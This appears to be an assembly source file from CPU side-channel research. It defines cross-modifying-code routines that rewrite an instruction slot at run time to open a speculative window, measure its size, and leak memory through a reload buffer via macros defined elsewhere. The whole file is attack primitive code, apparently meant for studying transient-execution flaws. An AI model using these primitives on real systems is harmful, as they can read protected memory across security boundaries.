%include "common.S"

section .data noexec write
    align 64
    trigger_store:   dq  0x0
    
    align 64
    trigger_exec:    dq  0x0


section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; xmc_win_size_trigger(void)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global xmc_win_size_trigger
xmc_win_size_trigger:
    GET_LOCK        trigger_store
    mov     dword [xmc_win_size_spec], 0xe7ff4190    ;nop, jmp r15
    RELEASE_LOCK    trigger_exec
ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; xmc_win_size(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global xmc_win_size
align 0x1000
xmc_win_size:
    push    r15
    lea     r15, [xmc_win_size_arch]

    ;Backup
    mov     rax, qword [xmc_win_size_spec]
    push    rax
    SERIALIZE

    RELEASE_LOCK    trigger_store
    GET_LOCK        trigger_exec
xmc_win_size_spec:
    LOADS  rdi
    ud2

xmc_win_size_arch:
    mfence
    ;Restore
    pop     rax
    mov     qword [xmc_win_size_spec], rax
    pop     r15
    ret




;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; xmc_leak_trigger(void)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global xmc_leak_trigger
xmc_leak_trigger:
    GET_LOCK        trigger_store
    mov     dword [xmc_leak_spec], 0xe7ff4190    ;nop, jmp r15
    RELEASE_LOCK    trigger_exec
ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; xmc_leak_size(uint8_t *reload_buffer, uint8_t *leak_ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global xmc_leak
align 0x1000
xmc_leak:
    push    r15
    lea     r15,    [xmc_leak_arch]
    
    ;backup
    mov     rax,    qword [xmc_leak_spec]
    push    rax

    RELEASE_LOCK    trigger_store
    GET_LOCK        trigger_exec
xmc_leak_spec:
    LEAK    rdi, rsi
    jmp     xmc_leak_spec

xmc_leak_arch:

    mfence
    pop     rax
    mov     qword [xmc_leak_spec], rax
    mfence

    pop     r15
    ret
